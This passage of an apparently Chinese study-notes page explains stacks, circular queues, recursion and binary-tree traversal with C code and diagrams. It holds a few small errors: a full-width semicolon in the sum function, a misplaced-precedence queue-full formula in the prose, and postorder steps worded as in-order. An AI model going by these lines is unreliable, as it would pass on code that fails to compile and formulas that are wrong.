pS-&gt;pBottom = pS-&gt;pTop;</span><br><span class="line">        pS-&gt;pBottom-&gt;pNext = <span class="literal">NULL</span>; <span class="comment">//也可写pS-&gt;pTop-&gt;pNext = NULL;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(PSTACK pS,<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNODE pNew = (PNODE)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(NODE));</span><br><span class="line"></span><br><span class="line">    pNew-&gt;data = val;</span><br><span class="line">    pNew-&gt;pNext = pS-&gt;pTop; <span class="comment">//pS-&gt;pTop不能改成pS-&gt;pBottom</span></span><br><span class="line">    pS-&gt;pTop = pNew;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse</span><span class="params">(PSTACK pS)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNODE p = pS-&gt;pTop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(p != pS-&gt;pBottom)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;pNext;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断栈是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">empty</span><span class="params">(PSTACK pS)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(pS-&gt;pTop == pS-&gt;pBottom)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把pS所指向的栈出栈，并把出栈的元素存入pVal形参所指向的变量中，如果出栈失败，返回false，否则返回true</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">pop</span><span class="params">(PSTACK pS, <span class="type">int</span> * pVal)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( empty(pS) ) <span class="comment">//pS本身存放的就是S的地址</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PNODE r = pS-&gt;pTop;</span><br><span class="line">        * pVal = r-&gt;data;</span><br><span class="line">        pS-&gt;pTop = r-&gt;pNext;</span><br><span class="line">        <span class="built_in">free</span>(r);</span><br><span class="line">        r = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//clear清空</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">clear</span><span class="params">(PSTACK pS)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(empty(pS))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        PNODE p = pS-&gt;pTop;</span><br><span class="line">        PNODE q = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(p != pS-&gt;pBottom)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//q永远是p的下个元素，最后p,q都指向了头结点</span></span><br><span class="line">            q = p-&gt;pNext;</span><br><span class="line">            <span class="built_in">free</span>(p);</span><br><span class="line">            p = q;</span><br><span class="line">        &#125;</span><br><span class="line">        pS-&gt;pTop = pS-&gt;pBottom;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/79666db/2.3.1.jpg" class="" title="头插式链表造栈"><h2 id="2-4-线性结构的两种常见应用之二-队列"><a href="#2-4-线性结构的两种常见应用之二-队列" class="headerlink" title="2.4 线性结构的两种常见应用之二 队列"></a>2.4 线性结构的两种常见应用之二 队列</h2><ul><li><p>定义：一种可以实现“先进先出”的存储结构</p></li><li><p>分类</p><ul><li><p>链式队列——用链表实现</p></li><li><p>静态队列——用数组实现</p><ol><li><p>静态队列通常都必须是循环队列</p></li><li><p>循环队列的讲解</p><ul><li><p>静态队列为什么必须是循环队列</p><blockquote><p>如果不是循环队列，静态队列(数组)里的空间只能使用一次</p></blockquote></li><li><p>循环队列需要几个参数来确定</p><blockquote><p>需要两个参数来确定队列，front 和 rear</p></blockquote></li><li><p>循环队列各个参数的含义</p><blockquote><ol><li>队列初始化：front和rear的值都是0</li><li>队列非空：<strong>front代表的是队列的第一个元素，rear代表的是队列的最后一个有效元素的下一个位置</strong></li><li>队列空：front和rear的值相等，但不一定是0</li></ol></blockquote></li><li><p>循环队列入队伪算法</p><blockquote><ol><li>将值存入rear所代表的位置</li><li>rear = (rear + 1) % 数组的长度</li></ol></blockquote></li><li><p>循环队列出队伪算法</p><blockquote><ol><li>front = (front + 1) % 数组的长度</li></ol></blockquote></li><li><p>如何判断循环队列是否为空</p><blockquote><p>if (front == rear)</p></blockquote></li><li><p>如何判断循环队列是否已满</p><blockquote><p>两种方式：</p><ol><li>if ((rear + 1 % 数组的长度) == front)（通常使用这种方式）</li><li>元素个数 = 数组长度 - 1</li></ol></blockquote></li></ul></li><li><p>队列的具体应用：<strong>所有和时间有关的操作都与队列有关</strong></p></li></ol></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Queue</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> * pBase;</span><br><span class="line">    <span class="type">int</span> front;</span><br><span class="line">    <span class="type">int</span> rear;</span><br><span class="line">&#125;QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">en_queue</span><span class="params">(QUEUE *, <span class="type">int</span>)</span>; <span class="comment">//入队</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">full_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">out_queue</span><span class="params">(QUEUE *, <span class="type">int</span> *)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">emput_queue</span><span class="params">(QUEUE *)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    QUEUE Q;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line"></span><br><span class="line">    init(&amp;Q);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">1</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">2</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">3</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">4</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">5</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">6</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">7</span>);</span><br><span class="line">    en_queue(&amp;Q, <span class="number">8</span>);    </span><br><span class="line">    traverse_queue(&amp;Q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( out_queue(&amp;Q, &amp;val) )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;出队成功，队列出队的元素是：%d\n&quot;</span>, val);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;出队失败！\n&quot;</span>);</span><br><span class="line">    traverse_queue(&amp;Q);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">(QUEUE *pQ)</span></span><br><span class="line">&#123;</span><br><span class="line">    pQ-&gt;pBase = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">6</span>);</span><br><span class="line">    pQ-&gt;front = <span class="number">0</span>;</span><br><span class="line">    pQ-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">full_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( (pQ-&gt;rear + <span class="number">1</span>) % <span class="number">6</span> == pQ-&gt;front )</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">en_queue</span><span class="params">(QUEUE * pQ, <span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( full_queue(pQ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        pQ-&gt;pBase[pQ-&gt;rear] = val;</span><br><span class="line">        pQ-&gt;rear = (pQ-&gt;rear + <span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">traverse_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = pQ-&gt;front;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(i != pQ-&gt;rear)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, pQ-&gt;pBase[i]);</span><br><span class="line">        i = (i+<span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断队列是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">emput_queue</span><span class="params">(QUEUE * pQ)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( pQ-&gt;front == pQ-&gt;rear)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">out_queue</span><span class="params">(QUEUE * pQ, <span class="type">int</span> * pVal)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( emput_queue(pQ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        *pVal = pQ-&gt;pBase[pQ-&gt;front];</span><br><span class="line">        pQ-&gt;front = (pQ-&gt;front + <span class="number">1</span>) % <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-递归"><a href="#2-5-递归" class="headerlink" title="2.5 递归"></a>2.5 递归</h2><p>定义：一个函数自己直接或间接调用自己</p><p>递归满足三个条件：</p><ol><li>递归必须得有一个明确的中止条件</li><li>该函数所处理的数据规模必须在递减</li><li>这个转化必须是可解的</li></ol><p>循环和递归的区别：</p><ul><li>递归<ul><li>易于理解</li><li>速度慢</li><li>存储空间大</li></ul></li><li>循环<ul><li>不易理解</li><li>速度快</li><li>存储空间小</li></ul></li></ul><p>函数的调用：</p><ul><li>当在一个函数的运行期间调用另一个函数时，在运行被调函数之前，系统需要完成三件事：<ol><li>将所有的实际参数、返回地址等信息传递给被调函数保存。</li><li>为被调函数的局部变量（也包括行参）分配存储空间。</li><li>将控制转移到被调函数的入口。</li></ol></li><li>从被调函数返回函数之前，系统也要完成三件事：<ol><li>保存被调函数的返回结果。</li><li>释放被调函数所占的存储空间。</li><li>依照被调函数保存的返回地址将控制转移到调用函数。</li></ol></li><li>当有多个函数相互调用时，按照“后调用先返回”的原则，上述函数之间信息传递和控制转移必须借助“栈”来实现，即系统将整个程序运行时所需的数据空间安排在一个栈中，每当调用一个函数时，就在栈顶分配一个存储区，进行压栈操作，每当一个函数退出时，就释放它的存储区，就做出栈操作，当前运行的函数永远都在栈顶位置。</li><li>A函数调用A函数和A函数调用B函数在计算机看来是没有任何区别的，只不过用我们日常的思维方式理解比较怪异而已！</li></ul><p>递归的应用：</p><ul><li>树和森林就是以递归的方式定义的</li><li>树和图的很多算法</li><li>很多数学公式：例如斐波拉契数列</li></ul><h3 id="2-5-1-1-2-3-…-100的和"><a href="#2-5-1-1-2-3-…-100的和" class="headerlink" title="2.5.1 1+2+3+…+100的和"></a>2.5.1 1+2+3+…+100的和</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//常量不能被赋值，所以如果误写成1 = n会报错</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == n)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>；</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> n + sum(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>,sum(<span class="number">100</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-2-求阶乘"><a href="#2-5-2-求阶乘" class="headerlink" title="2.5.2 求阶乘"></a>2.5.2 求阶乘</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//假定n的值是1或大于1的值</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">f</span><span class="params">(<span class="type">long</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( <span class="number">1</span> == n )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> f(n<span class="number">-1</span>) * n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, f(<span class="number">5</span>));<span class="comment">//120</span></span><br><span class="line">    <span class="comment">//printf(&quot;%d\n&quot;, f(100));//0,因为超过long型的最大范围</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-3-汉诺塔"><a href="#2-5-3-汉诺塔" class="headerlink" title="2.5.3 汉诺塔"></a>2.5.3 汉诺塔</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">tower_of_hanoi</span><span class="params">(<span class="type">int</span> n, <span class="type">char</span> A, <span class="type">char</span> B, <span class="type">char</span> C)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    如果是1个盘子</span></span><br><span class="line"><span class="comment">        直接将A柱子上的盘子从A移到C</span></span><br><span class="line"><span class="comment">    否则</span></span><br><span class="line"><span class="comment">        先将A柱子上的n-1个盘子借助C移到B</span></span><br><span class="line"><span class="comment">        直接将A柱子上的盘子从A移到C</span></span><br><span class="line"><span class="comment">        最后将B柱子上的n-1个盘子借助A移到C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> == n)</span><br><span class="line">        <span class="comment">//盘子从上往下编号</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;将编号为%d的盘子直接从%c柱子移到%c柱子\n&quot;</span>, n, A, C);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        tower_of_hanoi(n<span class="number">-1</span>, A, C, B);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;将编号为%d的盘子直接从%c柱子移到%c柱子\n&quot;</span>, n, A, C);</span><br><span class="line">        tower_of_hanoi(n<span class="number">-1</span>, B, A, C);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch1 = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> ch2 = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    <span class="type">char</span> ch3 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入要移动盘子的个数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    tower_of_hanoi(n,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-非线性结构"><a href="#3-非线性结构" class="headerlink" title="3. 非线性结构"></a>3. 非线性结构</h1><p><strong>树的定义</strong></p><ul><li>专业定义：<ol><li>有且只有一个称为根的节点</li><li>有若干个互不相交的子树，这些子树本身也是一颗树</li></ol></li><li>通俗定义：<ol><li>树是由节点和边组成</li><li>每个节点只有一个父节点但可以有多个子节点</li><li>但有一个节点例外，该节点没有父节点，此节点称为根节点</li></ol></li><li>专业术语：<ul><li>节点，父节点，子节点</li><li>子孙，堂兄弟</li><li>深度：从根节点到最底层节点的层数称之为深度，根节点是第一层</li><li>叶子节点：没有子节点的节点</li><li>非终端节点：实际就是非叶子节点</li><li>度：子节点的个数</li></ul></li></ul><p><strong>树的分类</strong></p><ul><li>一般树：任意一个节点的子节点的个数都不受限制</li><li>二叉树：任意一个节点的子节点个数最多两个，且子节点的位置不可更改<ul><li>分类<ul><li>一般二叉树</li><li>满二叉树：在不增加树层数的前提下，无法再多添加一个节点的二叉树就是满二叉树</li><li>完全二叉树：如果只是删除了满二叉树最底层最右边的连续若干个节点，这样形成的二叉树就是完全二叉树。（满二叉树是完全二叉树的一个特例）</li></ul></li></ul></li><li>森林：n个互不相交的树的集合</li></ul><p><strong>树的存储</strong></p><ul><li><p>二叉树的存储</p><ul><li><p>连续存储【完全二叉树】</p><blockquote><p>优点：查找某个节点的父节点和子节点（也包括判断有没有子节点）速度很快</p><p>缺点：耗用内存空间过大</p></blockquote></li><li><p>链式存储</p></li></ul></li><li><p>一般树的存储</p><ul><li><p>双亲表示法：求父节点方便</p></li><li><p>孩子表示法：求子节点方便</p></li><li><p>双亲孩子表示法：求父节点和子节点都很方便</p></li><li><p>二叉树表示法：把一个普通树转化成二叉树来存储</p><blockquote><p>具体转换方法：</p><p>设法保证任意一个节点的左指针域指向它的第一个孩子，右指针域指向它的亲兄弟，只要满足此条件，就可以把一个普通树转化为二叉树。</p><p>一个普通树转化成的二叉树一定没有右子树。</p></blockquote></li></ul></li><li><p>森林的存储</p><blockquote><p>先把森林转化为二叉树，再存储二叉树：</p><p>将相邻的父节点依次作为节点的右子树再对各父节点进行转化</p></blockquote></li></ul><p><strong>树的操作</strong></p><ul><li><p>遍历</p><ul><li><p>先序遍历【先访问根节点】</p><blockquote><ol><li><p>先访问根节点</p></li><li><p>再先序访问左子树</p></li><li><p>最后先序访问右子树</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A </span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E    F</span><br><span class="line"> / \   \  / \ </span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>先序遍历结果：ABDGHEICFJK</p></li></ol></blockquote></li><li><p>中序遍历【中间访问根节点】</p><blockquote><ol><li><p>中序遍历左子树</p></li><li><p>再访问根节点</p></li><li><p>再中序遍历右子树</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A </span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E   F</span><br><span class="line"> / \   \  / \</span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>中序遍历结果：GDHBEIACJFK</p></li></ol></blockquote></li><li><p>后序遍历【最后访问根节点】</p><blockquote><ol><li><p>先中序遍历左子树</p></li><li><p>再中序遍历右子树</p></li><li><p>最后遍历根节点</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">      A</span><br><span class="line">     / \</span><br><span class="line">    B   C</span><br><span class="line">   / \   \</span><br><span class="line">  D   E   F </span><br><span class="line"> / \   \  / \</span><br><span class="line">G   H   I J  k</span><br></pre></td></tr></table></figure><p>后序遍历结果：GHDIEBJKFCA</p></li></ol></blockquote></li></ul></li><li><p>已知两种遍历序列求原始二叉树</p><blockquote><p>通过<strong>先序和中序</strong>或者<strong>中序和后序</strong>我们可以还原出原始二叉树，但是通过先序和后序是无法还原出原始二叉树。</p><p>例子1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">先序：ABCDEFGH，中序：BDCEAFHG，求后序？</span><br><span class="line">分析：按照先序的定义，A为最外层根节点，按照中序的定义和前面的结论可知BDCE为A节点的左子树节点，FHG为A节点的右子树，再依次按照两个遍历定义可以推出原始二叉树为：        </span><br><span class="line"> A       </span><br><span class="line">    / \ </span><br><span class="line">          B   F</span><br><span class="line">            \    \</span><br><span class="line">             C    G</span><br><span class="line">            / \  /  </span><br><span class="line">           D  E  H</span><br><span class="line">那么此二叉树的后序为：DECBHGFA</span><br></pre></td></tr></table></figure><p>例子2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">先序：ABDGHCEFI，中序：GDHBAECIF，求后序？</span><br><span class="line">分析：按照先序的定义得到A为最外层根节点，再根据中序结果可知GDHB为A的左子树，ECIF为A的右子树；B先出现在先序结果中可知B为左子树的根节点，再根据中序结果知B节点没有右子树，GDH均为B节点的左子树，再根据先序结果D先出现，知D为B左子树的根节点，再根据先序发现G在D的后面且中序中G在D的前面得出G为D左子树的根节点，那么D的右子树的根节点就是H了，依次类推A的右子树，得出原始二叉树为：      </span><br><span class="line"> A</span><br><span class="line">/ \</span><br><span class="line">B   C</span><br><span class="line">   /   / \</span><br><span class="line">  D   E   F</span><br><span class="line"> / \     /</span><br><span class="line">G   H   I</span><br><span 